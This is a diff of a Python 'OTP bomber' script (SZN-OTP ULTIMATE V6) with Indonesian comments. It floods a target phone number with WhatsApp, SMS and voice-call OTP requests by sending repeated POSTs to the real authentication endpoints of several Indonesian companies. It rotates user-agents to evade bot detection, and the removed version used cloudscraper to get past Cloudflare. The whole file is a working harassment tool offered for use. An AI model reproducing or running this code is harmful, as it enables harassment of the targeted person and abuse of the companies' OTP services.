@@ -1,93 +1,112 @@
-import os, sys, time, json, random
-import cloudscraper
-from fake_useragent import UserAgent
-from rich.console import Console
-from rich.panel import Panel
-from rich.live import Live
-from rich.table import Table
+import requests
+import time
+import random
+import os
 
-# Inisialisasi
-console = Console()
-ua = UserAgent()
-scraper = cloudscraper.create_scraper()
+# --- KONFIGURASI WARNA (Biar Terminal Gak Lawak) ---
+R = '\033[31m' # Merah
+G = '\033[32m' # Hijau
+Y = '\033[33m' # Kuning
+B = '\033[34m' # Biru
+C = '\033[36m' # Cyan
+W = '\033[37m' # Putih
+
+class UltimateSpammer:
+    def __init__(self, target):
+        self.target = target
+        # List User-Agent biar gak kedeteksi bot yang sama terus
+        self.ua_list = [
+            "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
+        ]
+
+    def get_headers(self):
+        return {
+            'User-Agent': random.choice(self.ua_list),
+            'Content-Type': 'application/json',
+            'Referer': 'https://google.com/',
+            'Accept': 'application/json'
+        }
+
+    def spam_wa(self):
+        """Metode Spam WhatsApp (SkillAcademy & KreditPintar)"""
+        print(f"{C}[*] Sending WA OTP...{W}", end=" ", flush=True)
+        try:
+            # Endpoint 1: Skill Academy
+            res = requests.post("https://dashboard.skillacademy.com/api/v1/auth/otp", 
+                               json={"phoneNumber": self.target}, headers=self.get_headers(), timeout=7)
+            if res.status_code == 200:
+                print(f"{G}SUCCESS [WA-1]{W}")
+            else:
+                # Fallback ke KreditPintar kalau gagal
+                res2 = requests.post("https://api.kreditpintar.com/v1/auth/otp", 
+                                    json={"phone": self.target, "category": "SIGN_IN"}, headers=self.get_headers(), timeout=7)
+                print(f"{G}SUCCESS [WA-2]{W}" if res2.status_code == 200 else f"{R}FAILED{W}")
+        except: print(f"{Y}TIMEOUT{W}")
+
+    def spam_sms(self):
+        """Metode Spam SMS OTP (Matahari & Alodokter Login)"""
+        print(f"{C}[*] Sending SMS OTP...{W}", end=" ", flush=True)
+        try:
+            # API Matahari
+            res = requests.post("https://api.matahari.com/v1/auth/otp", 
+                               json={"phone": self.target, "type": "register"}, headers=self.get_headers(), timeout=7)
+            if res.status_code == 200:
+                print(f"{G}SUCCESS [SMS-1]{W}")
+            else:
+                # Fallback API Alodokter Login
+                res2 = requests.post("https://api.alodokter.com/v1/auth/login", 
+                                    json={"phone": self.target}, headers=self.get_headers(), timeout=7)
+                print(f"{G}SUCCESS [SMS-2]{W}" if res2.status_code == 200 else f"{R}FAILED{W}")
+        except: print(f"{Y}TIMEOUT{W}")
+
+    def spam_call(self):
+        """Metode Spam Call OTP (KlikDokter / Alodokter Call)"""
+        print(f"{C}[*] Requesting CALL...{W}", end=" ", flush=True)
+        try:
+            # API Alodokter Call
+            res = requests.post("https://api.alodokter.com/v1/auth/otp_call", 
+                               json={"phone": self.target}, headers=self.get_headers(), timeout=7)
+            print(f"{G}SUCCESS [CALL]{W}" if res.status_code == 200 else f"{R}FAILED{W}")
+        except: print(f"{Y}TIMEOUT{W}")
 
 def banner():
     os.system('clear')
-    console.print(Panel.fit(
-        "[bold magenta]⚡ SZN-OTP ULTIMATE V6 ⚡[/bold magenta]\n"
-        "[bold white]Status: [bold green]High Bypass Enabled[/bold green][/bold white]\n"
-        "[bold cyan]Instagram: HZNXWICK[/bold cyan]",
-        subtitle="[yellow]Advanced Modular Engine[/yellow]",
-        border_style="bright_blue"
-    ))
-
-def send_request(api, target_full, target_biasa):
-    headers = {
-        "User-Agent": ua.random,
-        "Accept": "application/json",
-        "Content-Type": "application/json",
-        "Origin": "https://www.mapclub.com",
-        "Referer": "https://www.mapclub.com/en/user/signup"
-    }
-    
-    try:
-        url = api['url'].format(target_full=target_full, target_tanpa_62=target_biasa)
-        
-        if api['method'] == "POST":
-            # Format data JSON secara dinamis
-            payload = {k: v.format(target_full=target_full, target_tanpa_62=target_biasa) if isinstance(v, str) else v for k, v in api['data'].items()}
-            r = scraper.post(url, json=payload, headers=headers, timeout=10)
-        else:
-            r = scraper.get(url, headers=headers, timeout=10)
-            
-        if r.status_code in [200, 201]:
-            return "[bold green]SUCCESS[/bold green]"
-        else:
-            return f"[bold red]FAIL ({r.status_code})[/bold red]"
-    except:
-        return "[bold yellow]TIMEOUT[/bold yellow]"
+    print(f"""{Y}
+    ╔════════════════════════════════════════╗
+    ║      SZN-OTP ULTIMATE V6 REBORN        ║
+    ║   {W}Status: {G}High Bypass Mode Enabled      {Y}║
+    ╚════════════════════════════════════════╝{W}
+    """)
 
 def main():
     banner()
+    target = input(f"{B}[?] Target (8xxx): {W}")
+    # Auto-fix nomor kalau depannya masih 08 atau 62
+    if target.startswith('0'): target = target[1:]
+    elif target.startswith('62'): target = target[2:]
     
-    # Input Target
-    target = console.input("[bold white][?] Nomor Target (08xxx): [/bold white]")
-    jumlah = int(console.input("[bold white][?] Jumlah Bom: [/bold white]"))
-    jeda = int(console.input("[bold white][?] Jeda (detik): [/bold white]"))
-
-    # Load Database API
-    try:
-        with open('lib/api.json', 'r') as f:
-            db = json.load(f)
-    except:
-        console.print("[bold red][!] File lib/api.json tidak ditemukan![/bold red]")
-        return
-
-    # Normalisasi Nomor
-    bersih = target[1:] if target.startswith("0") else target[2:] if target.startswith("62") else target
-    t_full = "+62" + bersih
-    t_biasa = bersih
-
-    # Proses Tempur
-    console.print(f"\n[bold cyan][*] Memulai serangan ke {t_full}...[/bold cyan]\n")
+    nomor_final = "0" + target # Standar lokal 08xxx
     
-    for i in range(jumlah):
-        table = Table(title=f"Putaran ke-{i+1}", show_header=True, header_style="bold magenta")
-        table.add_column("API Name", style="dim")
-        table.add_column("Status", justify="right")
+    rounds = int(input(f"{B}[?] Jumlah Bom: {W}"))
+    delay = int(input(f"{B}[?] Jeda (detik): {W}"))
+
+    bot = UltimateSpammer(nomor_final)
+
+    for i in range(rounds):
+        print(f"\n{Y}[ Putaran ke-{i+1} ]{W}")
+        bot.spam_wa()
+        bot.spam_sms()
+        bot.spam_call()
         
-        with Live(table, refresh_per_second=4):
-            # Gabungkan semua API (WhatsApp + Call)
-            all_api = db['whatsapp'] + db['call']
-            random.shuffle(all_api) # Acak API biar gak kebaca polanya
-            
-            for api in all_api:
-                res = send_request(api, t_full, t_biasa)
-                table.add_row(api['name'], res)
-                time.sleep(1) # Jeda antar tembakan biar aman
-        
-        console.print(f"[bold yellow][!] Selesai putaran {i+1}, jeda {jeda} detik...[/bold yellow]")
-        time.sleep(jeda)
+        if i < rounds - 1:
+            print(f"\n{C}[!] Menunggu jeda {delay} detik...{W}")
+            time.sleep(delay)
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n{R}[!] Berhenti dipaksa!{W}")
+                                     
